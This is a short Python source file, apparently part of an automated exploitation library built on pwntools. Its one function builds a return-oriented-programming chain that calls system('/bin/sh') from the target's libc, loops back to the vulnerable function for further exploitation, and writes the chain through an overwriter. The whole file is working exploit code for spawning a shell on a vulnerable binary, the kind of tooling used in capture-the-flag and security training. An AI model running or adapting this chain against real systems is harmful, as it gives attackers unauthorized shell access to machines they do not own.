from autorop import PwnState, arutil
from pwn import log, ROP


def system_binsh(state: PwnState) -> PwnState:
    """Call `system("/bin/sh")` via a ROP chain.

    Call `system("/bin/sh")` using a ROP chain built from `state.libc` and
    written by `state.overwriter`."""
    rop = ROP([state.elf, state.libc])
    assert state.libc is not None
    rop.system(next(state.libc.search(b"/bin/sh\x00")))
    rop.call(state.vuln_function)  # just in case, to allow for further exploitation
    log.info(rop.dump())

    arutil.call_overwriter(state, rop.chain())

    return state
